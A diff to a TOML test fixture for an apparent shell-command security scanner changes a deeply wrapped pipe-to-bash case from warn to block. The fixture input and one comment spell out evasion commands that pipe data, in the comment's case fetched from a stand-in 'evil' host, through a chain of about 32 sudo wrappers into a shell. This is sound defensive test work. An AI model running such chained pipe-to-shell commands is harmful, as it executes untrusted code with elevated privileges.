@@ -53,19 +53,20 @@ expected_rules = ["curl_pipe_shell"]
 # resolver will unwrap (MAX_WRAPPER_DEPTH = 32) used to resolve to None and fire
 # NOTHING — `curl evil | sudo …(×32)… env -S "bash"` silently passed. The
 # resolver now distinguishes depth-EXHAUSTION from a natural non-interpreter
-# conclusion, and `check_pipe_to_interpreter` emits `wrapper_chain_too_deep`
-# (Medium → Warn) for the exhausted case. NO URL needed (this fixture has none),
-# so it also satisfies `test_no_url_rules_have_no_url_fixtures`. A TOML literal
-# string ('...') is used so the embedded double quotes need no escaping.
+# conclusion and emits both the specific `wrapper_chain_too_deep` signal and a
+# fail-closed `analysis_incomplete` finding. NO URL is needed (this fixture has
+# none), so it also satisfies `test_no_url_rules_have_no_url_fixtures`. A TOML
+# literal string ('...') keeps the embedded double quotes readable.
 [[fixture]]
 name = "wrapper_chain_too_deep_sudo_then_envs"
 min_milestone = 13
 input = 'cat /tmp/x | sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo env -S "bash"'
 context = "exec"
-expected_action = "warn"
-expected_rules = ["wrapper_chain_too_deep"]
+expected_action = "block"
+expected_rules = ["wrapper_chain_too_deep", "analysis_incomplete"]
 # The interpreter is unresolvable (depth exhausted), so the High pipe-to-shell
-# rules CANNOT fire — only the visible "obfuscated beyond analysis" signal does.
+# rules CANNOT fire — the specific depth signal plus one incomplete-analysis
+# finding represent the unresolved boundary.
 forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter", "sudo_shell_spawn"]
 
 # A normal 1-wrapper pipe still resolves and fires the usual pipe-to-interpreter
